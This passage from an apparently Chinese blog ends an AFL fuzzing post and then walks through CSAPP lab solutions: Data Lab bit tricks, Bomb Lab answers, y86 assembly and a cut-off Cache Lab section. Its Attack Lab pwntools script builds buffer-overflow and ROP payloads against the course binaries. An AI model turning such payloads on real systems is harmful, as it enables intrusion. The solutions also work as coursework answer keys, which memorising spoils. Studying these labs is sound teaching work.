class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fuzz_out/</span><br><span class="line">├── crashes</span><br><span class="line">│   ├── id:000000,sig:06,src:000000,op:havoc,rep:32</span><br><span class="line">│   ├── id:000001,sig:06,src:000000,op:havoc,rep:32</span><br><span class="line">│   ├── id:000002,sig:11,src:000001,op:havoc,rep:2</span><br><span class="line">│   ├── id:000003,sig:06,src:000002,op:havoc,rep:16</span><br><span class="line">│   ├── id:000004,sig:11,src:000000,op:havoc,rep:128</span><br><span class="line">│   ├── id:000005,sig:11,src:000002,op:havoc,rep:16</span><br><span class="line">│   └── README.txt</span><br><span class="line">├── fuzz_bitmap</span><br><span class="line">├── fuzzer_stats</span><br><span class="line">├── hangs</span><br><span class="line">├── plot_data</span><br><span class="line">└── queue</span><br><span class="line">    ├── id:000000,orig:test</span><br><span class="line">    ├── id:000001,src:000000,op:arith8,pos:0,val:-30,+cov</span><br><span class="line">    └── id:000002,src:000000,op:arith8,pos:0,val:-35,+cov</span><br><span class="line"></span><br><span class="line">3 directories, 13 files</span><br></pre></td></tr></table></figure><p><code>queue</code>：存放所有具有独特执行路径的测试用例。<br><code>crashes</code>：导致目标接收致命<code>signal</code>而崩溃的独特测试用例。<br><code>crashes/README.txt</code>：保存了目标执行这些<code>crash</code>文件的命令行参数。<br><code>hangs</code>：导致目标超时的独特测试用例。<br><code>fuzzer_stats</code>：<code>afl-fuzz</code>的运行状态。<br><code>plot_data</code>：用于<code>afl-plot</code>绘图。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95">https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95</a></p><p><a href="https://www.f-secure.com/en/consulting/our-thinking/15-minute-guide-to-fuzzing">https://www.f-secure.com/en/consulting/our-thinking/15-minute-guide-to-fuzzing</a></p><p><a href="https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/">https://foxglovesecurity.com/2016/03/15/fuzzing-workflows-a-fuzz-job-from-start-to-finish/</a></p><p><a href="https://paper.seebug.org/841/#2_3">https://paper.seebug.org/841/#2_3</a></p><p><a href="https://paper.seebug.org/842/#_1">https://paper.seebug.org/842/#_1</a></p><p><a href="https://xz.aliyun.com/t/4314#toc-8">https://xz.aliyun.com/t/4314#toc-8</a></p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
          <category> Afl </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> Build </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP Lab</title>
      <link href="posts/ab6e7b0/"/>
      <url>posts/ab6e7b0/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>记录一下 css app lab，<a href="http://csapp.cs.cmu.edu/3e/labs.html">下载地址</a></p><p>代码放在了 <a href="https://github.com/focu5/CSAPP-Labs">Github</a></p><h3 id="Data-Lab"><a href="#Data-Lab" class="headerlink" title="Data Lab"></a>Data Lab</h3><h4 id="bitXor"><a href="#bitXor" class="headerlink" title="bitXor"></a>bitXor</h4><p><code>x ^ y = (~x &amp; y) | (x &amp; ~y) </code></p><p>题目限制我们仅使用 <code>&amp; ～</code>，所以我们想办法代替 <code>｜</code> 即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~(~(~x &amp; y) &amp; (~(x &amp; ~y)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h4><p>以补码形式返回最小的整数。即：符号为是1，其余均为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h4><p>如果是最大的整数则返回1.</p><p>注意三个比较讨厌的数：</p><blockquote><p>0x7fffffff：01111111111111111111111111111111<br>0xffffffff：11111111111111111111111111111111<br>0x80000000：10000000000000000000000000000000</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !((~x^(x+<span class="number">1</span>)) | !(x+<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h4><p>判断所有奇数位是否都为1.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = <span class="number">0xaa</span> + (<span class="number">0xaa</span>&lt;&lt;<span class="number">8</span>);</span><br><span class="line">  y = y+ (y &lt;&lt; <span class="number">16</span>);</span><br><span class="line">  <span class="keyword">return</span> !((y &amp; x) ^ y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路：可以先自行构造出一个所有奇数位都为1的标准数，在进行比较。</p><h4 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h4><p>返回相反数，常识题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h4><p>计算输入值是否是数字 0-9 的 <code>ASCII</code> 值。</p><p>思路：先观察0x30-0x39的二进制数有什么特点，发现0x30-0x3f之间的第4、5位均为1。假设 x 是 0 - 9 之间的一个数，！(x &lt;&lt; 4 ^ 0x3) = 1，y = x + 0x6， ！(y &lt;&lt; 4 ^ 0x3) = 1，确保这两个同时成立即可判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y = x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">  x = x + <span class="number">0x6</span>;</span><br><span class="line">  <span class="keyword">int</span> z = x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">return</span> !(y ^ <span class="number">0x3</span>) &amp; !(z ^ <span class="number">0x3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h4><p>执行运算符 x ? y : z：当 x 不为 0 时，返回 y；否则返回 z。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">  x = !x + ~<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (y &amp; x) | (z &amp; ~x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h4><p>判断 x &lt;= y</p><p><a href="https://zhuanlan.zhihu.com/p/59534845">参考</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> negX=~x+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> addX=negX+y;</span><br><span class="line">  <span class="keyword">int</span> checkSign = addX&gt;&gt;<span class="number">31</span>&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> leftBit = <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> xLeft = x&amp;leftBit;</span><br><span class="line">  <span class="keyword">int</span> yLeft = y&amp;leftBit;</span><br><span class="line">  <span class="keyword">int</span> bitXor = xLeft ^ yLeft;</span><br><span class="line">  bitXor = (bitXor&gt;&gt;<span class="number">31</span>)&amp;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> ((!bitXor)&amp;(!checkSign))|(bitXor&amp;(xLeft&gt;&gt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h4><p>实现<code> ！</code>运算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h4><p>用二分法来判断。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> b16,b8,b4,b2,b1,b0;</span><br><span class="line">  <span class="keyword">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">  x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line">  b16 = !!(x&gt;&gt;<span class="number">16</span>)&lt;&lt;<span class="number">4</span>;</span><br><span class="line">  x = x&gt;&gt;b16;<span class="comment">//如果有（至少需要16位），则将原数右移16位</span></span><br><span class="line">  b8 = !!(x&gt;&gt;<span class="number">8</span>)&lt;&lt;<span class="number">3</span>;<span class="comment">//剩余位高8位是否有1</span></span><br><span class="line">  x = x&gt;&gt;b8;<span class="comment">//如果有（至少需要16+8=24位），则右移8位</span></span><br><span class="line">  b4 = !!(x&gt;&gt;<span class="number">4</span>)&lt;&lt;<span class="number">2</span>;<span class="comment">//同理</span></span><br><span class="line">  x = x&gt;&gt;b4;</span><br><span class="line">  b2 = !!(x&gt;&gt;<span class="number">2</span>)&lt;&lt;<span class="number">1</span>;</span><br><span class="line">  x = x&gt;&gt;b2;</span><br><span class="line">  b1 = !!(x&gt;&gt;<span class="number">1</span>);</span><br><span class="line">  x = x&gt;&gt;b1;</span><br><span class="line">  b0 = x;</span><br><span class="line">  <span class="keyword">return</span> b16+b8+b4+b2+b1+b0+<span class="number">1</span>;<span class="comment">//+1表示加上符号位</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Bomb-Lab"><a href="#Bomb-Lab" class="headerlink" title="Bomb Lab"></a>Bomb Lab</h3><p>其实有re、pwn基础，拆解还不算很困难。（还可以结合<code>ida</code>分析，不过个人感觉怼汇编理解会更好一些.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bomb&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#phase_1</span></span><br><span class="line">p.sendline(<span class="string">&quot;Border relations with Canada have never been better.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_2</span></span><br><span class="line">p.sendline(<span class="string">&quot;1 2 4 8 16 32&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_3</span></span><br><span class="line">p.sendline(<span class="string">&quot;1 311&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_3</span></span><br><span class="line">p.sendline(<span class="string">&quot;7 0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_4</span></span><br><span class="line">p.sendline(<span class="string">&quot;YONUFG&quot;</span>)</span><br><span class="line"><span class="comment">#db()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#phase_5</span></span><br><span class="line">p.sendline(<span class="string">&quot;4 3 2 1 6 5&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Attack-Lab"><a href="#Attack-Lab" class="headerlink" title="Attack Lab"></a>Attack Lab</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">argv1 = sys.argv[<span class="number">1</span>]</span><br><span class="line">argv2 = sys.argv[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> argv1 == <span class="string">&quot;part1&quot;</span> :</span><br><span class="line">p = process(argv=[<span class="string">&#x27;./ctarget&#x27;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"><span class="keyword">elif</span> argv1 == <span class="string">&quot;part2&quot;</span>:</span><br><span class="line">p = process(argv=[<span class="string">&#x27;./rtarget&#x27;</span>, <span class="string">&quot;-q&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn1</span>():</span></span><br><span class="line"><span class="comment">#ROPgadget --binary ctarget --only &quot;pop|ret&quot;</span></span><br><span class="line">rdi_ret = <span class="number">0x000000000040141b</span></span><br><span class="line"><span class="keyword">if</span> argv2 == <span class="string">&quot;level_1&quot;</span>:</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x28</span>+p64(<span class="number">0x4017c0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_2&quot;</span>:</span><br><span class="line">rdi_ret = <span class="number">0x40141b</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x59b997fa</span>) + p64(<span class="number">0x4017ec</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_3&quot;</span>:</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x5561dcb8</span>) + p64(<span class="number">0x4018fa</span>) + <span class="string">&quot;0x59b997fa&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn2</span>():</span></span><br><span class="line"><span class="comment">#ROPgadget --binary rtarget --only &quot;pop|ret&quot;</span></span><br><span class="line">rdi_ret = <span class="number">0x000000000040141b</span></span><br><span class="line"><span class="keyword">if</span> argv2 == <span class="string">&quot;level_2&quot;</span>:</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *<span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x59b997fa</span>) + p64(<span class="number">0x4017ec</span>) </span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="keyword">elif</span> argv2 == <span class="string">&quot;level_3&quot;</span>:</span><br><span class="line">read_plt = <span class="number">0x400D30</span></span><br><span class="line">main_addr = <span class="number">0x4011AD</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span> + p64(rdi_ret) + p64(<span class="number">0x6054E4</span>) + p64(<span class="number">0x4018fa</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> argv1 == <span class="string">&quot;part1&quot;</span>:</span><br><span class="line">pwn1()</span><br><span class="line"><span class="keyword">elif</span> argv1 == <span class="string">&quot;part2&quot;</span>:</span><br><span class="line">pwn2()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Arch-Lab"><a href="#Arch-Lab" class="headerlink" title="Arch Lab"></a>Arch Lab</h3><blockquote><p>$ sudo apt-get install bison flex</p><p>$ cd Arch_lab</p><p>$ tar xvf  sim.tar</p><p>$ cd sim; make clean; make</p></blockquote><h4 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h4><p>根据<code>examples.c</code>给的三个函数，写出对应的<code>y86-64</code> 汇编代码。</p><blockquote><p>csapp p252 给了示例代码，模仿即可。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#sum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">.quad 0xc00</span><br><span class="line">.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq ele1, %rdi</span><br><span class="line">call sum_list         # sum_list(list_ptr ls)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">sum_list:</span><br><span class="line">xorq %rax, %rax       # val &#x3D; 0</span><br><span class="line">jmp loop1             # goto loop1</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">mrmovq 0(%rdi),%rsi   # get ls-&gt;val</span><br><span class="line">addq %rsi, %rax       # val +&#x3D; ls-&gt;val</span><br><span class="line">mrmovq 8(%rdi),%rsi   # get ls-&gt;next</span><br><span class="line">rrmovq %rsi,%rdi  # ls &#x3D; ls-&gt;next</span><br><span class="line"></span><br><span class="line">loop1:</span><br><span class="line">andq %rdi, %rdi       # and $rdi</span><br><span class="line">jne loop              # if !&#x3D; 0 goto loop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#rsum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad ele2</span><br><span class="line">ele2:</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad ele3</span><br><span class="line">ele3:</span><br><span class="line">.quad 0xc00</span><br><span class="line">.quad 0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq ele1, %rdi</span><br><span class="line">call rsum_list         # rsum_list(list_ptr ls)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">rsum_list:</span><br><span class="line">pushq %r12</span><br><span class="line">xorq %rax, %rax        # val &#x3D; 0</span><br><span class="line">andq %rdi, %rdi        </span><br><span class="line">je return              # if &#x3D;&#x3D; 0 goto return</span><br><span class="line">mrmovq 0(%rdi), %r12   # get ls-&gt;val</span><br><span class="line">mrmovq 8(%rdi), %rdi   # get ls-&gt;next</span><br><span class="line">call rsum_list         # call rsum_list</span><br><span class="line">addq %r12, %rax        # val + rest</span><br><span class="line">return:</span><br><span class="line">popq %r12</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#rsum.ys</span><br><span class="line">#Execution begins at address 0</span><br><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp    # set up stack pointer</span><br><span class="line">call main             # Execute main program</span><br><span class="line">halt  # Terminate program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">src:</span><br><span class="line">.quad 0x00a</span><br><span class="line">.quad 0x0b0</span><br><span class="line">.quad 0xc00</span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">.quad 0x111</span><br><span class="line">.quad 0x222</span><br><span class="line">.quad 0x333</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">irmovq src, %rdi</span><br><span class="line">irmovq dest, %rsi</span><br><span class="line">irmovq $3, %rdx</span><br><span class="line">call copy_block         # copy_block(long *src, long *dest, long len)</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">copy_block:</span><br><span class="line">irmovq $1, %r13</span><br><span class="line">irmovq $8, %r14</span><br><span class="line">xorq %rax, %rax        # result &#x3D; 0</span><br><span class="line">jmp loop1</span><br><span class="line"></span><br><span class="line">loop:</span><br><span class="line">mrmovq 0(%rdi), %r12</span><br><span class="line">addq %r14, %rdi</span><br><span class="line">rmmovq %r12, (%rsi)</span><br><span class="line">addq %r14, %rsi</span><br><span class="line">xorq %r12, %rax</span><br><span class="line">subq %r13, %rdx</span><br><span class="line">loop1:</span><br><span class="line">andq %rdx, %rdx</span><br><span class="line">jg loop</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#Stack starts here and grows to lower addresses</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure><h4 id="PartB"><a href="#PartB" class="headerlink" title="PartB"></a>PartB</h4><p>按照 <code>iaddq</code> 的属性在 <code>sim/seq/seq-full.hcl</code> 中特定的位置添加 “IIADDQ” 即可</p><h3 id="Cache-Lab"><a href="#Cache-Lab" class="headerlink" title="Cache Lab"></a>Cache Lab</h3><blockquote><p>推荐阅读：</p><p><a href="https://www.bilibili.com/video/BV1rE41127Re?p=41">https://www.bilibili.com/video/BV1rE41127Re?p=41</a></p></blockquote><h4 id="Part-A-1"><a href="#Part-A-1" class="headerlink" title="Part A"></a>Part A</h4><p>在<code>csim.c</code>中写一个Cache，使用LRU替换策略。我们目的就是实现一个功能和<code>csim-ref</code>一样的程序。其实预至的<code>csim-ref</code>是没有脱符号表的…</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200730141947.jpeg" alt="Cache结构"></p><blockquote><p>数据访问：</p><ul><li>L：Load，数据载入，可能发生1次miss</li><li>S：Store，可能发生1次miss</li><li>M：store后再load，两次访存。1 miss &amp; 1 hit + 可能eviction</li></ul></blockquote><figure 